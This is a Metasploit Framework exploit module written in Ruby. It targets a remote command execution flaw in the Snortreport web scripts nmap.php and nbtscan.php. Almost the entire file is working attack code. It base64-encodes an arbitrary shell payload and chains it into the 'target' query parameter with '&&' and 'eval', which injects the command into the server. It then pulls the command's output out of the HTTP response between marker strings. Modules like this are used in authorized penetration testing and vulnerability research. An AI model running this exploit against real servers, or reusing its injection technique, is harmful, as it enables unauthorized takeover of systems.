##
# $Id: snortreport_exec.rb 13843 2011-10-09 06:12:54Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Snortreport nmap.php and nbtscan.php Remote Command Execution',
			'Description'    => %q{
				This module exploits an arbitrary command execution vulnerability in
				nmap.php and nbtscan.php scripts.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Paul Rascagneres'  #itrust consulting during hack.lu 2011
				],
			'Version'        => '$Revision: 13843 $',
			'Payload'        =>
			{
				'Compat'     =>
				{
					'PayloadType'  => 'cmd',
					'RequiredCmd'  => 'generic perl ruby bash telnet',
				}
			},
			'Platform'       => ['unix', 'linux'],
			'Arch'           => ARCH_CMD,
			'Targets'        => [['Automatic',{}]],
			'DisclosureDate' => 'Sep 19 2011',
			'DefaultTarget'  => 0
		))

		register_options(
			[
				OptString.new('URI', [true, "The full URI path to nmap.php or nbtscan.php", "/snortreport-1.3.2/nmap.php"]),
			],self.class)
	end

	def exploit
		base64_payload = ""
		base64_payload_temp=Base64.encode64(payload.encoded).chomp
		base64_payload_temp.each_line do |line|
			base64_payload << line.chomp
		end

		start = "127.0.0.1 && echo XXXXX && eval $(echo "
		last  = " | base64 -d) && echo ZZZZZ"
		custom_payload = start << base64_payload << last

		res = send_request_cgi({
			'uri'       => datastore['URI'],
			'vars_get'  =>
			{
				'target' => custom_payload
			}
		},10)

		if (res)
			to_print=false
			already_print=false
			part=res.body.gsub("<BR>","")
			part.each_line do |line|
				if line =~ /ZZZZZ/
					to_print=false
				end
				if to_print == true
					print(line)
				end
				if line =~ /XXXXX/
					already_print=true
					to_print=true
				end
			end

			if already_print == false
				print_error("This server may not be vulnerable")
			end
		else
			print_error("No response from the server")
		end
	end
end
